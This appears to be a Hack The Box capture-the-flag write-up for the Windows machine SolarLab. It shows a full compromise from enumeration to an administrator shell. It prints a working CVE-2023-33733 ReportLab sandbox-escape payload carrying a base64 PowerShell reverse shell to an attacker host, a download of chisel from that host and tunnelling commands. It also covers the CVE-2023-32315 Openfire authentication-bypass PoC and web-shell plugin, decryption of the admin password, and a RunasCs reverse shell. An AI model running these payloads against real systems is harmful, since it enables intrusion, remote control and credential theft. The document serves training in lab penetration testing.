---
title: HTB - SolarLab
date: 2024-09-15 00:00:00 + 1000
categories: [Windows,Web App,CTF,HTB]
tags: [htb, CVE-2023-33733, CVE-2023-32315, Arbitrary Code Execution (ACE), RunasCs, chisel, openfire, smbclient, openfire Administration bypass, RCE]
comments: false
---

The challenge involved exploiting a vulnerable ReportHub web application to gain initial access, exploited a CVE-2023-33733 vulnerability in the ReportLab PDF Library, sending a crafted payload through a Leave Request form to get a shell as the `blake` user. Next, found the an Openfire server running on the box and used Chisel to tunnel into its ports. By exploiting CVE-2023-32315, a known authentication bypass vulnerability in Openfire, they gained access as the `openfire` user. Then found the administrator password hash stored in the Openfire configuration and cracked it using a decryption tool and then used `RunasCs.exe` with administrator credentials and gain a root shell

## Common Enumeration 

### Namp

Running the `sudo nmap -p- -sC -sV -oA recon/allport 10.10.11.16 --open` - Nmap spit back five juicy ports

```bash
$ sudo nmap -p- -sC -sV -oA recon/allport 10.10.11.16 --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 20:51 AEST
Nmap scan report for 10.10.11.16
Host is up (0.0054s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
80/tcp   open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://solarlab.htb/
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
6791/tcp open  http          nginx 1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
|_http-server-header: nginx/1.24.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-13T10:53:24
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 168.97 seconds

```

As they redirected to `solarlab.htb` and `report.solarlab.htb`. I added those to my `/etc/hosts` file
### Website - 80

Browsing the `http://solarlab.htb/` - brings up home page as below

![img](/assets/img/SolarLab/1.webp)

There was a contact form, but it seemed broken - sending data just appended it to the URL

![img](/assets/img/SolarLab/2.webp)

Nothing too interesting here. It looked like a static website, so I moved on
### Website - 6791
Next, I headed to `http://report.solarlab.htb:6791/`, where I found the ReportHub login page

![img](/assets/img/SolarLab/3.webp)

Without valid credentials I was locked out. Time to find some juicy intel
### Enumerating SMB

I ran `smbclient` with guest credentials, hoping to find some goodies and The "documents" share was readable

```bash
$ netexec smb 10.10.11.16 -u 'guest' -p '' --shares
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\guest: 
SMB         10.10.11.16     445    SOLARLAB         [*] Enumerated shares
SMB         10.10.11.16     445    SOLARLAB         Share           Permissions     Remark
SMB         10.10.11.16     445    SOLARLAB         -----           -----------     ------
SMB         10.10.11.16     445    SOLARLAB         ADMIN$                          Remote Admin
SMB         10.10.11.16     445    SOLARLAB         C$                              Default share
SMB         10.10.11.16     445    SOLARLAB         Documents       READ            
SMB         10.10.11.16     445    SOLARLAB         IPC$            READ            Remote IPC
```

I downloaded two files: `details-file.xlsx` and `old_leave_request_form.docx`

```bash
$ smbclient //10.10.11.16/Documents -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Apr 27 00:47:14 2024
  ..                                 DR        0  Sat Apr 27 00:47:14 2024
  concepts                            D        0  Sat Apr 27 00:41:57 2024
  desktop.ini                       AHS      278  Fri Nov 17 21:54:43 2023
  details-file.xlsx                   A    12793  Fri Nov 17 23:27:21 2023
  My Music                        DHSrn        0  Fri Nov 17 06:36:51 2023
  My Pictures                     DHSrn        0  Fri Nov 17 06:36:51 2023
  My Videos                       DHSrn        0  Fri Nov 17 06:36:51 2023
  old_leave_request_form.docx         A    37194  Fri Nov 17 21:35:57 2023

smb: \> get desktop.ini
getting file \desktop.ini of size 278 as desktop.ini (12.9 KiloBytes/sec) (average 12.9 KiloBytes/sec)
smb: \> get details-file.xlsx
getting file \details-file.xlsx of size 12793 as details-file.xlsx (520.5 KiloBytes/sec) (average 283.7 KiloBytes/sec)
smb: \> get old_leave_request_form.docx
getting file \old_leave_request_form.docx of size 37194 as old_leave_request_form.docx (1252.5 KiloBytes/sec) (average 663.3 KiloBytes/sec)
smb: \> 
```

The `old_leave_request_form.docx` contained some boring holiday requests

![img](/assets/img/SolarLab/4.webp)

But the `details-file.xlsx` held a treasure trove of credentials!

![img](/assets/img/SolarLab/5.webp)

Seems all credential are valid

| Username                     | Password               |
| ---------------------------- | ---------------------- |
| Alexander.knight@gmail[.]com | al;ksdhfewoiuh         |
| KAlexander                   | dkjafblkjadsfgl        |
| Alexander.knight@gmail[.]com | d398sadsknr390         |
| blake.byte                   | ThisCanB3typedeasily1@ |
| AlexanderK                   | danenacia9234n         |
| ClaudiaS                     | dadsfawe9dafkn         |

```bash
$ nxc smb 10.10.11.16 -u user.txt -p pass.txt --no-bruteforce --continue-on-succes
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\Alexander.knight@gmail.com:l;ksdhfewoiuh 
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\KAlexander:dkjafblkjadsfgl 
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\Alexander.knight@gmail.com:d398sadsknr390 
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\blake.byte:ThisCanB3typedeasily1@ 
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\AlexanderK:danenacia9234n 
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\ClaudiaS:dadsfawe9dafkn 
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\: STATUS_ACCESS_DENIED 
```

I tried those creds on the ReportHub login, but no dice. I noticed the usernames followed a pattern: first name plus the first letter of the last name. So I tried `blakeb` instead of just `blake`. And boom! I was in!
### Login to report.solerlab

Logging in with the creds I'd found, `blakeb:ThisCanB3typedeasily1@`, It brings up the ReportHub dashboard

![img](/assets/img/SolarLab/6.webp)

Time to start digging. I clicked on "Leave Request" and filled out the form, generating a PDF

![img](/assets/img/SolarLab/7.webp)

The PDF looked pretty standard

![img](/assets/img/SolarLab/8.webp)

But I had a hunch. I ran `exiftool` on it to check the metadata. It was generated using the ReportLab PDF Library

```bash
$ exiftool output.pdf
ExifTool Version Number         : 12.76
File Name                       : output.pdf
Directory                       : .
File Size                       : 296 kB
File Modification Date/Time     : 2024:06:12 22:01:39+10:00
File Access Date/Time           : 2024:06:12 22:01:39+10:00
File Inode Change Date/Time     : 2024:06:12 22:01:39+10:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Author                          : (anonymous)
Create Date                     : 2024:06:12 14:59:49-02:00
Creator                         : (unspecified)
Modify Date                     : 2024:06:12 14:59:49-02:00
Producer                        : ReportLab PDF Library - www.reportlab.com
Subject                         : (unspecified)
Title                           : (anonymous)
Trapped                         : False
Page Mode                       : UseNone
Page Count                      : 1
```

A quick Google search for "reportlab pdf library vulnerability" led me to CVE-2023-33733. This vulnerability allows attackers to execute arbitrary code due to unsafe handling of attributes in the `rl_safe_eval` sandbox: [Learning more about this here](https://github.com/c53elyas/CVE-2023-33733) 
## Initial Access

### Shell as blake

I grabbed a PowerShell reverse shell payload [This power-shell payload](https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/3ad91872713d60888dca95850c3f6e706231cb40/powershell_reverse_shell.ps1) base64 encoded it, and set up a listener

```bash
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAyACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>
```

Now for the fun part. I sent the payload via the `/leaveRequest` endpoint, replacing the `Content-Disposition` value with the encoded payload

![img](/assets/img/SolarLab/9.webp)

Got shell as "solarlab\blake" and got the user.txt "C:\Users\blake\Desktop>"
And just like that, I had a shell as "solarlab\blake"! and I grabbed the `user.txt` flag

```bash
PS C:\Users\blake\Desktop> ls
Directory: C:\Users\blake\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-ar---         6/12/2024  12:49 PM             34 user.txt                                                             


PS C:\Users\blake\Desktop> type user.txt
2a9ec5......
PS C:\Users\blake\Desktop> 
```

user.txt

```text
2a9ec5......
```

## Shell as openfire

Before using the automated scripts, I decided to do some manual recon. I checked `netstat` on the box and saw the ports `9090` and `9091`. A quick `net user` command show another user: `openfire`

```bash

PS C:\Users\blake\Desktop> netstat -ano                                                                                                             
Active Connections
Proto  Local Address          Foreign Address        State           PID                                                                          
TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5400
TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900
TCP    127.0.0.1:5275         0.0.0.0:0              LISTENING       3060
TCP    127.0.0.1:5276         0.0.0.0:0              LISTENING       3060
TCP    127.0.0.1:7070         0.0.0.0:0              LISTENING       3060
TCP    127.0.0.1:7443         0.0.0.0:0              LISTENING       3060
TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3060
TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3060
TCP    127.0.0.1:49669        127.0.0.1:49670        ESTABLISHED     3060
TCP    127.0.0.1:49670        127.0.0.1:49669        ESTABLISHED     3060
TCP    127.0.0.1:49671        127.0.0.1:49672        ESTABLISHED     3060
....snip....
```

A quick Google search for "openfire 9090 & 9091" led me to [CVE-2023-32315](https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm), an authentication bypass vulnerability in the Openfire Administration Console

### Port forwarding with chisel

I needed to get a foothold on those juicy Openfire ports. I downloaded `chisel.exe` from GitHub and uploaded it to the target machine

```bash
PS C:\Users\blake\Downloads> curl http://10.10.14.22:8000/chisel.exe -o chisel.exe
PS C:\Users\blake\Downloads> dir
Directory: C:\Users\blake\Downloads

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/13/2024   1:55 PM        9006080 chisel.exe                                                           

PS C:\Users\blake\Downloads> 
```

### Setting up reverse proxy

Attacker machine: `./chisel_linux server -p 8001 -reverse`
Target Machine: `./chisel.exe client 10.10.14.22:8001 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091`

```bash
PS C:\Users\blake\Downloads> ./chisel.exe client 10.10.14.22:8001 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
$ ./chisel_linux server -p 8001 -reverse
2024/06/13 21:04:41 server: Reverse tunnelling enabled
2024/06/13 21:04:41 server: Fingerprint hVdPHLIG+dt1RSX+2WPraHtyHgk89A/7EXy0K1PwYDU=
2024/06/13 21:04:41 server: Listening on http://0.0.0.0:8001
2024/06/13 21:05:21 server: session#1: tun: proxy#R:9090=>9090: Listening
2024/06/13 21:05:21 server: session#1: tun: proxy#R:9091=>9091: Listening
```

Browsing the `http://127.0.0.1:9090` brings to Openfire login page,  It was running version 4.7.4

![img](/assets/img/SolarLab/10.webp)

I tried the credentials found earlier, but no luck. Another Google search for "Openfire 4.7.4" led me to a PoC for [CVE-2023-32315](https://github.com/miko550/CVE-2023-32315). I downloaded and ran it, and it created a username: `s9fawx` and password: `oevxgg`

```bash
$ python3 CVE-2023-32315.py -t http://127.0.0.1:9090


 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██████╗  ██╗███████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗╚════██╗╚════██╗███║██╔════╝
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚═══██╗██╔═══╝  ╚═══██╗ ██║╚════██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     ██████╔╝███████╗██████╔╝ ██║███████║
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝      ╚═════╝ ╚══════╝╚═════╝  ╚═╝╚══════╝
                                                                                                       
Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215)
Use at your own risk!

[..] Checking target: http://127.0.0.1:9090
Successfully retrieved JSESSIONID: node0eqqvy3fsdk2818yvmscfgbjjz1.node0 + csrf: 7sfCxR9iVrgsHJD
User added successfully: url: http://127.0.0.1:9090 username: s9fawx password: oevxgg
```

I logged into the Openfire Administration Console with those credentials

![img](/assets/img/SolarLab/11.webp)

Following the steps in the PoC

I uploaded the `openfire-management-tool-plugin.jar` plugin

![img](/assets/img/SolarLab/12.webp)

Then, I went to the server settings and enabled the Management tool

![img](/assets/img/SolarLab/13.webp)

This gave me access to a web shell with a password of "123"

![img](/assets/img/SolarLab/14.webp)

I selected "System Command" and ran `whoami` it's `openfire`!

![img](/assets/img/SolarLab/15.webp)
## Enumerating for Privilege escalation

Time to escalate privileges! I grabbed that same PowerShell reverse shell payload, [This power-shell payload](https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/3ad91872713d60888dca95850c3f6e706231cb40/powershell_reverse_shell.ps1) base64 encoded it, and set up a listener

```bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAyACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

I got a shell as `openfire`

![img](/assets/img/SolarLab/16.webp)

I noticed a directory called `embedded-db` in the Openfire installation

```bash
PS C:\Program Files\Openfire> ls

Directory: C:\Program Files\Openfire

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        11/17/2023   2:11 PM                .install4j                                                           
d-----        11/17/2023   2:11 PM                bin                                                                  
d-----         6/12/2024  12:48 PM                conf                                                                 
d-----        11/17/2023   2:11 PM                documentation                                                        
d-----         6/12/2024  12:48 PM                embedded-db                                                          
d-----        11/17/2023   2:11 PM                lib                                                                  
d-----        11/17/2023   2:24 PM                logs                                                                 
d-----         6/13/2024   2:27 PM                plugins                                                              
d-----        11/17/2023   2:11 PM                resources                                                            
-a----         11/9/2022   5:59 PM         375002 changelog.html                                                       
-a----         2/16/2022   5:55 PM          10874 LICENSE.html                                                         
-a----         2/16/2022   5:55 PM           5403 README.html                                                          
-a----         11/9/2022   6:00 PM         798720 uninstall.exe                                                        


PS C:\Program Files\Openfire> 
```

I browsed to `C:\Program Files\Openfire\embedded-db` and found a following of files

```bash
PS C:\Program Files\Openfire\embedded-db> ls

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         6/12/2024  12:48 PM                openfire.tmp                                                         
-a----         6/12/2024  12:48 PM              0 openfire.lck                                                         
-a----         6/13/2024   2:27 PM           1825 openfire.log                                                         
-a----         6/12/2024  12:48 PM            106 openfire.properties                                                  
-a----          5/7/2024   9:15 PM          16161 openfire.script                                                      

PS C:\Program Files\Openfire\embedded-db> 
```

One file stood out: `openfire.script`. This file contained the password hash for the administrator account

```bash
PS C:\Program Files\Openfire\embedded-db> type openfire.script 
....snip....
SET SCHEMA SYSTEM_LOBS
INSERT INTO BLOCKS VALUES(0,2147483647,0)
SET SCHEMA PUBLIC
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec
25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','00170022374078
5','0')

INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
....snip....
```

A quick Google search for "openfire decrypt password" led me to a GitHub repo called [openfire_decrypt](https://github.com/c0rdis/openfire_decrypt). I cloned it and ran it, and it decrypted the password hash. The password was: `ThisPasswordShouldDo!@`

```bash
$ java OpenFireDecryptPass.java becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)
```

## Shell as Administrator

I uploaded `RunasCs.exe` to the target machine and executed it to run a command prompt as administrator. I was in! I grabbed the `root.txt` flag

```bash
PS C:\Users\openfire\Downloads> .\RunasCs.exe administrator ThisPasswordShouldDo!@ whoami

solarlab\administrator
PS C:\Users\openfire\Downloads> 

PS C:\Users\openfire\Downloads> .\RunasCs.exe administrator ThisPasswordShouldDo!@ cmd.exe -r 10.10.14.22:1337

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-226ff$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 5032 created in background.
PS C:\Users\openfire\Downloads> 

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
$ rlwrap -cAr nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.16] 51784
Microsoft Windows [Version 10.0.19045.4355]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
solarlab\administrator

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
27a1b27......

C:\Windows\system32>
```

root.txt

```text
27a1b27......
```

